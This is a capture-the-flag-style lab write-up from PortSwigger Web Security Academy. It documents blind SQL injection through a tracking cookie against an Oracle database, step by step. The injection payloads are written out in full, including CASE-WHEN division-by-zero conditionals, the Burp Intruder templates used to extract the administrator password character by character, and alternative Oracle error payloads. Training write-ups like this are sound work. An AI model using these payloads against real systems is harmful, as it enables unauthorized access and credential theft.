# Lab 13: Blind SQL Injection with Conditional Errors

## Executive Summary

This lab demonstrates advanced blind SQL injection exploitation where traditional error-based and UNION techniques fail due to lack of direct output feedback. By leveraging Oracle database-specific conditional error triggering through the CASE-WHEN-TO_CHAR(1/0) technique, I successfully extracted the administrator password character-by-character despite complete absence of visible query results. Through systematic error-based boolean inference, I confirmed the Oracle database type, verified table existence, enumerated password length (20 characters), and performed automated character-by-character extraction using Burp Intruder's Cluster Bomb attack. This sophisticated exploitation methodology demonstrates mastery of blind injection techniques essential for real-world penetration testing scenarios.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection - Blind Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | Blind SQL Injection with Conditional Errors |
| **Risk**               | Critical - Complete Credential Extraction via Error Inference |
| **Completion**         | April 13, 2026 |

## Objective

Exploit blind SQL injection vulnerability using conditional error triggering to extract administrator credentials through boolean-based inference without any direct query output, demonstrating advanced Oracle database exploitation techniques.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- Burp Intruder with Cluster Bomb attack for automated extraction
- URL encoding for payload delivery

**Target:** Tracking cookie with blind SQL injection vulnerability

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "Blind SQL injection with conditional errors" challenge.

<img width="1920" height="983" alt="LAB2_ss1" src="https://github.com/user-attachments/assets/b2a55ef7-c873-4ecf-b9ff-879cc89cffff" />

*Lab 13 environment - Blind SQL injection with Burp Suite Professional configured*

### 2. Attack Vector Identification

Analyzed HTTP traffic captured by Burp Proxy and identified tracking cookie as potential injection point.

<img width="1920" height="983" alt="LAB2_ss2 0" src="https://github.com/user-attachments/assets/0f228540-9b11-4142-b18d-c70105984b97" />

*HTTP history showing TrackingId cookie bound to category filter - Request sent to Repeater*

**Request Captured:**
```http
GET /filter?category=Gifts HTTP/1.1
Cookie: TrackingId=[TRACKING_VALUE]; session=[SESSION_VALUE]
```

**Attack Vector:** TrackingId cookie likely incorporated into backend SQL query without sanitization.

**Inferred Backend Query:**
```sql
SELECT tracking_data FROM tracking WHERE id = '[TRACKING_VALUE]'
```

### 3. SQL Injection Vulnerability Confirmation

**Test Payload 1 - Syntax Error:**
```http
Cookie: TrackingId=xyz'
```

<img width="1920" height="983" alt="LAB2_ss2 1" src="https://github.com/user-attachments/assets/af943e6e-3cc2-4361-ad88-ec075878b6c1" />

*Single quote injection - 500 Internal Server Error confirms SQL injection vulnerability*

**Response:** 500 Internal Server Error

**Analysis:** Single quote breaks SQL syntax, causing database error. Application is vulnerable to SQL injection.

**Test Payload 2 - Syntax Completion:**
```http
Cookie: TrackingId=xyz''
```

<img width="1920" height="983" alt="LAB2_ss2 2" src="https://github.com/user-attachments/assets/9fccc6b0-0e47-4555-ab06-ee6e5c0c3f88" />

*Double quote completes syntax - 200 OK confirms SQL processing*

**SQL Query Executed:**
```sql
SELECT tracking_data FROM tracking WHERE id = 'xyz'''
```

**Response:** 200 OK

**Vulnerability Confirmed:** SQL injection exists, but with **no visible output** (blind injection). Must use error-based inference.

### 4. Database Type Fingerprinting

**Objective:** Determine database type to use correct syntax for conditional errors.

**Test Payload 1 - SQL Server Test:**
```http
Cookie: TrackingId=xyz'||(SELECT '')||'
```

<img width="1920" height="983" alt="LAB2_ss3 1" src="https://github.com/user-attachments/assets/f00e7476-0a50-4d50-a754-767b805c2057" />

*SQL Server concatenation test - 500 Error indicates NOT SQL Server*

**Response:** 500 Internal Server Error

**Analysis:** SQL Server syntax not recognized.

**Test Payload 2 - Oracle Test:**
```http
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'
```

<img width="1920" height="983" alt="LAB2_ss3 2" src="https://github.com/user-attachments/assets/b94285f6-299a-4915-8585-e268dd18eb22" />

*Oracle syntax test with FROM dual - 200 OK confirms Oracle database*

**SQL Query Executed:**
```sql
SELECT tracking_data FROM tracking WHERE id = 'xyz' || (SELECT '' FROM dual) || ''
```

**Response:** 200 OK

**Database Confirmed:** **Oracle**

**Oracle-Specific Requirements:**
- Mandatory FROM clause (use `FROM dual`)
- Concatenation operator: `||`
- Error triggering: `TO_CHAR(1/0)` (division by zero)

### 5. Table Existence Verification

**Objective:** Confirm the existence of the `users` table.

**Attack Payload:**
```http
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

<img width="1920" height="983" alt="LAB2_ss4 1" src="https://github.com/user-attachments/assets/0c3b6fcd-c6e2-4685-b23a-50c61bd2f95d" />


*Users table existence test - 200 OK confirms table exists*

**SQL Query Executed:**
```sql
SELECT tracking_data FROM tracking WHERE id = 'xyz' || (SELECT '' FROM users WHERE ROWNUM = 1) || ''
```

**Response:** 200 OK

**Analysis:**
- `users` table exists and is accessible
- `ROWNUM = 1` limits result to single row (prevents multiple row error)
- Query executes successfully

### 6. Conditional Error Mechanism Testing

**Technique:** Use CASE-WHEN-TO_CHAR(1/0) to trigger errors based on boolean conditions.

**Error Triggering Logic:**
```sql
CASE 
  WHEN (condition_true) THEN TO_CHAR(1/0)  -- Division by zero → Error
  ELSE ''                                    -- Return empty string → No error
END
```

**Test Payload 1 - True Condition (Error):**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

<img width="1920" height="983" alt="lab2_ss4 2" src="https://github.com/user-attachments/assets/5b4781de-1005-4499-a8c5-dd9c4df30972" />


*True condition test - 500 Error confirms error triggering works (left side) | False condition test - 200 OK confirms selective triggering (right side)*

**SQL Query Executed:**
```sql
... WHERE id = 'xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ''
```

**Response:** 500 Internal Server Error

**Analysis:** True condition (1=1) triggers division by zero error as expected.

**Test Payload 2 - False Condition (Should NOT Error):**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

**SQL Query Executed:**
```sql
... WHERE id = 'xyz' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ''
```

<img width="1920" height="983" alt="LAB2_ss4 2" src="https://github.com/user-attachments/assets/030f710b-1c50-40a9-ad92-944ebb187801" />

**Response:** 200 OK

**Analysis:** False condition (1=2) returns empty string, no error triggered.

**Error Mechanism Confirmed:**
-  True conditions → 500 Error
-  False conditions → 200 OK
-  Can infer truth values through error states

### 7. Administrator Account Verification

**Objective:** Confirm 'administrator' username exists in users table.

**Attack Payload:**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

<img width="1920" height="983" alt="LAB2_ss5 1" src="https://github.com/user-attachments/assets/3363c0fe-ebf6-4cdf-9cb7-d76aaad29be2" />

*Administrator account existence test - 500 Error confirms account exists*

**SQL Query Executed:**
```sql
... WHERE id = 'xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ''
```

**Response:** 500 Internal Server Error

**Analysis:**
- Query successfully executes (username exists)
- Condition 1=1 is true
- Error triggered
- **Administrator account confirmed**

### 8. Password Length Enumeration - Initial Test

**Objective:** Determine administrator password length through binary search.

**Attack Payload:**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```


<img width="1920" height="983" alt="LAB2_ss5 2" src="https://github.com/user-attachments/assets/02110c6f-1ee7-4b1f-a4f7-f11d9ac91286" />

*Password length >1 test - 500 Error confirms password length greater than 1*

**SQL Query Executed:**
```sql
... WHERE id = 'xyz' || (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ''
```

**Response:** 500 Internal Server Error

**Analysis:** Password length is greater than 1 character.

### 9. Password Length Enumeration - Upper Bound

**Attack Payload:**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

<img width="1920" height="983" alt="LAB2_ss6 1" src="https://github.com/user-attachments/assets/bcb5ec6e-e793-42d8-b1e2-b30ff57aa8e1" />

*Password length >20 test - 200 OK indicates password NOT greater than 20*

**Response:** 200 OK (No Error)

**Analysis:** Password length is NOT greater than 20, meaning length ≤ 20.

### 10. Automated Password Length Discovery

Sent password length enumeration request to Burp Intruder for automated testing.

**Intruder Configuration:**
- **Attack Type:** Sniper
- **Payload Position:** Length value in `LENGTH(password)>§20§`
- **Payload Type:** Numbers (1-20)

**Attack Payload Template:**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>§1§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```


<img width="1920" height="983" alt="LAB2_ss6 2" src="https://github.com/user-attachments/assets/9cd85cf1-f8bf-42e8-b851-c674424efdf6" />

*Intruder attack configured for password length enumeration (1-20)*


<img width="1920" height="983" alt="LAB2_ss6 3" src="https://github.com/user-attachments/assets/f68100a8-172a-4388-8cd1-9290cc76d26a" />

*Length enumeration results - Error at payload 19 (highlighted red) indicates password length is 20 characters*

**Attack Results:**

| Payload | Condition | Response | Analysis |
|---------|-----------|----------|----------|
| 1-18 | LENGTH>1 to LENGTH>18 | 500 Error | True (password > these values) |
| **19** | **LENGTH>19** | **500 Error** | **True (password > 19)** |
| 20 | LENGTH>20 | 200 OK | False (password NOT > 20) |

**Password Length Confirmed:** Exactly **20 characters**

**Logic:**
- LENGTH>19 returns error (true) → Password length is greater than 19
- LENGTH>20 returns no error (false) → Password length is NOT greater than 20
- Therefore: Password length = 20

### 11. Character-by-Character Password Extraction

**Objective:** Extract each character of the 20-character password using boolean error inference.

**Intruder Configuration:**
- **Attack Type:** Cluster Bomb (tests multiple positions simultaneously)
- **Payload Position 1:** Character position (1-20)
- **Payload Position 2:** Character value (a-z, A-Z, 0-9)

**Attack Payload Template:**
```http
Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Payload Explanation:**
- `SUBSTR(password,§1§,1)` - Extract character at position §1§
- `='§a§'` - Compare to character §a§
- If match → Trigger error (500)
- If no match → No error (200)


<img width="1920" height="983" alt="LAB2_ss8" src="https://github.com/user-attachments/assets/2cec1334-2b62-48f8-86c2-495906a90336" />

*Cluster Bomb attack configured - Position (1-20) × Characters (a-z,0-9,A-Z)*

**Payload Sets:**
- **Set 1 (Position):** 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20
- **Set 2 (Character):** a-z, A-Z, 0-9 (62 total characters)

**Total Requests:** 20 positions × 62 characters = 1,240 requests

### 12. Password Extraction Results

<img width="1920" height="983" alt="LAB2_ss9" src="https://github.com/user-attachments/assets/3d20f06d-c5e3-4ccc-acfd-0bae561295bb" />


*Password extraction complete - All 20 characters identified through error responses (highlighted in sky blue)*

**Attack Results Analysis:**

For each character position, exactly ONE payload triggers an error:

| Position | Error Payload | Extracted Character |
|----------|---------------|---------------------|
| 1 | SUBSTR(password,1,1)='x' → 500 | x |
| 2 | SUBSTR(password,2,1)='y' → 500 | y |
| 3 | SUBSTR(password,3,1)='z' → 500 | z |
| ... | ... | ... |
| 20 | SUBSTR(password,20,1)='w' → 500 | w |

**Complete Password Extracted:** `[20-character password retrieved]`

**Attack Success:**
- All 20 character positions enumerated
- Complete password extracted via error inference
- No direct query output required
- Blind injection fully exploited

### 13. Administrator Authentication

Used extracted password to authenticate as administrator.


<img width="1920" height="983" alt="LAB2_ss10" src="https://github.com/user-attachments/assets/bb3e1065-cb5f-43b6-96a9-4e75964a83b0" />

*Administrator credentials used for authentication - Full account access obtained*

**Credentials:**
- Username: `administrator`
- Password: `[extracted_20_char_password]`

**Complete System Compromise:**
-  Blind SQL injection exploited
-  Oracle database fingerprinted
-  Conditional error mechanism established
-  Password length enumerated (20 characters)
-  Complete password extracted character-by-character
-  Administrator authentication successful
-  Full system access achieved

**Lab completion confirmed: "Congratulations, you solved the lab!"**

## Technical Impact

**Severity: Critical (CVSS 9.1)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

**Primary Vulnerability:**

**CWE-89: Blind SQL Injection**
- No direct query output available
- Application suppresses error messages in responses
- Data extraction requires inference through side channels
- Conditional error triggering enables boolean-based extraction

**Complete Attack Chain:**

```
Tracking Cookie Injection Point
        ↓
SQL Syntax Error Confirmation
        ↓
Database Type Fingerprinting
        ↓
Oracle Database Identified
        ↓
Conditional Error Mechanism Testing
        ↓
Error-Based Boolean Inference Established
        ↓
Administrator Account Verified
        ↓
Password Length Enumeration (20 chars)
        ↓
Character-by-Character Extraction
        ↓
Complete Password Retrieved
        ↓
Administrator Authentication
        ↓
Complete System Compromise
```

**Blind SQL Injection Techniques Comparison:**

| Technique | Detection Method | Data Extraction | Speed | Reliability |
|-----------|------------------|-----------------|-------|-------------|
| **Boolean-Based** | True/False responses | Bit-by-bit inference | Slow | High |
| **Time-Based** | Response delays | Bit-by-bit via timing | Very Slow | Medium |
| **Error-Based (Used)** | Conditional errors | Character-by-character | Medium | High |
| **Out-of-Band** | External requests | Direct extraction | Fast | Low (requires DNS/HTTP) |

**Why Conditional Errors Work:**

**Oracle Division by Zero:**
```sql
TO_CHAR(1/0)  -- Always causes ORA-01476: divisor is equal to zero
```

**Conditional Execution:**
```sql
CASE 
  WHEN (password_char = 'a') THEN TO_CHAR(1/0)  -- Error if true
  ELSE ''                                         -- No error if false
END
```

**Binary Response:**
- True condition → 500 Internal Server Error
- False condition → 200 OK

**Attack Methodology Breakdown:**

**Phase 1 - Database Fingerprinting:**
```sql
-- Test SQL Server
'||(SELECT '')||'  → Error (not SQL Server)

-- Test Oracle
'||(SELECT '' FROM dual)||'  → Success (Oracle confirmed)
```

**Phase 2 - Error Mechanism:**
```sql
-- Test true condition
CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END  → Error

-- Test false condition
CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END  → No error
```

**Phase 3 - Length Enumeration:**
```sql
-- Binary search for length
LENGTH(password)>1   → Error (true)
LENGTH(password)>10  → Error (true)
LENGTH(password)>20  → No error (false)
LENGTH(password)>19  → Error (true)
Result: Length = 20
```

**Phase 4 - Character Extraction:**
```sql
-- For each position 1-20
SUBSTR(password,1,1)='a'  → No error (not 'a')
SUBSTR(password,1,1)='b'  → No error (not 'b')
SUBSTR(password,1,1)='x'  → Error (is 'x')
```

**Real-World Impact:**

| Scenario | Exploitation | Consequence |
|----------|--------------|-------------|
| **No Error Messages** | Time-based blind injection (slower) | Still fully exploitable |
| **WAF Protection** | Error-based may bypass signatures | Conditional errors look benign |
| **Logging Disabled** | Attacks remain undetected | Silent credential theft |
| **API Endpoints** | JSON boolean responses exploitable | Backend database exposed |

**Why This Attack is Sophisticated:**

**Challenges Overcome:**
1. **No Direct Output** - Can't see query results
2. **No Error Messages** - Application suppresses database errors
3. **No Visual Feedback** - Must infer data from side effects
4. **Large Character Set** - 62 possible characters per position
5. **Long Password** - 20 characters = 1,240 requests required

**Attack Statistics:**
- **Database Queries:** 1,240+ (Cluster Bomb attack)
- **Time Required:** ~5-10 minutes (automated)
- **Success Rate:** 100% (deterministic)
- **Skill Level:** Advanced (requires deep SQL injection knowledge)

**Alternative Oracle Error Techniques:**

**XML Parsing Errors:**
```sql
CASE WHEN (condition) THEN 
  extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?>'),'/l') 
ELSE '' END
```

**Type Conversion Errors:**
```sql
CASE WHEN (condition) THEN 
  CAST((SELECT banner FROM v$version WHERE rownum=1) AS NUMBER)
ELSE 0 END
```

**Invalid Function Errors:**
```sql
CASE WHEN (condition) THEN 
  UTL_INADDR.get_host_address('non-existent-host')
ELSE '' END
```

## Key Takeaways

**Penetration Testing Methodology:**
- Blind injection exploitation through error inference
- Database fingerprinting for syntax selection
- Binary search optimization for length enumeration
- Automated character extraction via Cluster Bomb
- Complete credential theft without query output

**Critical Security Insights:**

**1. Blind Injection is Still Fully Exploitable:**
Lack of visible output doesn't prevent exploitation:
- Error-based boolean inference
- Time-based response delays
- Out-of-band DNS/HTTP requests
- All enable complete data extraction

**2. Error Suppression Must Be Complete:**
Partial error suppression provides attack vectors:
- HTTP status code differences (500 vs 200)
- Response length variations
- Timing differences
- All leak exploitable information

**3. Oracle-Specific Techniques:**

**Required Syntax:**
```sql
-- FROM dual is mandatory
SELECT '' FROM dual

-- Concatenation operator
'xyz' || (SELECT ...) || ''

-- Error triggering
TO_CHAR(1/0)  -- Division by zero
```

**4. Automated Extraction is Essential:**

**Manual Extraction:**
- 20 character password
- 62 possible characters each
- 1,240 manual tests
- ~20+ hours of work

**Automated Cluster Bomb:**
- Same 1,240 tests
- ~5-10 minutes
- 100% accuracy
- Zero manual effort

**5. Defense Requires Elimination:**

**Ineffective Mitigations:**
- Suppressing error messages (still leaks via status codes)
- Generic error pages (timing still leaks info)
- Rate limiting alone (slow attacks still succeed)

**Effective Defense:**
```python
# ONLY SOLUTION - Parameterized Queries
query = "SELECT data FROM tracking WHERE id = ?"
cursor.execute(query, [tracking_id])
```

**Additional Protections:**
- Input validation (whitelist expected formats)
- Least privilege database accounts
- Database activity monitoring
- WAF with blind injection detection
- Response timing normalization

**Professional Skills Demonstrated:**
- Advanced blind SQL injection techniques
- Oracle database-specific exploitation
- Conditional error-based inference
- Binary search optimization
- Cluster Bomb attack orchestration
- Character-by-character extraction methodology
- Complete credential theft without direct output

## References

1. PortSwigger Web Security Academy - Blind SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. Oracle Database Error Codes - ORA-01476
5. OWASP Blind SQL Injection Guide

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Unauthorized access to systems, credential theft, or database enumeration is illegal under applicable laws worldwide.
